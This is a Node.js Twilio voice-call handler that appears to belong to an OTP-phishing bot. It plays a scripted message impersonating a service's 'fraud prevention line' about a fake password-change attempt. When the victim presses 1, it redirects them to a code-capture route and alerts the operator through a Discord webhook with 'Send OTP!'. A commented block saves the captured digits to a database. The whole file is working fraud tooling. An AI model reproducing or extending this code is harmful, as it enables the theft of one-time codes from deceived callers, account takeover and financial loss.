const VoiceResponse = require('twilio/lib/twiml/VoiceResponse');
const callsModel = require('../Database/Models/calls');

/**
*  Delay
*/
const sleep = (delay) => new Promise((resolve) => setTimeout(resolve, delay));

module.exports = async function(request, response) {
    const twiml = new VoiceResponse;
    const config = require('.././config');

    var callSid = request.body.CallSid;

    if (!!!callSid) {
        return response.status(200).json({
            error: 'Please give us the callSid.'
        });
    }

    const {
        Webhook,
        MessageBuilder
    } = require('discord-webhook-node');
    const hook = new Webhook(config.discordwebhook || '');

    let calls = await callsModel.findOne({ callsid: callSid });

    var service = calls == undefined ? 'default' : calls.service;
    var name = calls.name == null ? '' : calls.name;
    
    var ask = `Hello ${name}, this is the ${service} fraud prevention line. We have sent this automated voice message due to an attempt to change the password on your ${service} account. If this was not you please press 1.`;
     
    const gatherNode = twiml.gather({ numDigits: 1, timeout: 5, });

    if (request.body.Digits) {
        switch (request.body.Digits) {
            case '1':
                twiml.redirect(`/gatherotp/${config.apipassword}`);
                var embed;
                embed = new MessageBuilder()
                    .setTitle(`:mobile_phone: ${calls.itsto}`)
                    .setColor('15844367')
                    .setDescription(`:man_shrugging: User : <@${calls.user}>\n\nSend OTP!`)
                    .setTimestamp();
                hook.send(embed);
                break;
            default:
                twiml.say("Sorry, I don't understand that choice.");
                twiml.pause();
                twiml.redirect(`/voice/${config.apipassword}`);
                break;
        }
    }else{
        gatherNode.say(ask);
    }

    // Render the response as XML in reply to the webhook request
    response.type('text/xml');
    response.send(twiml.toString());
};



/* if (input.length == length && input.match(/^[0-9]+$/) != null && input != null) {

     twiml.say(end);
    await callsModel.findOneAndUpdate({callsid: callSid}, {
        digits: input
    })
} */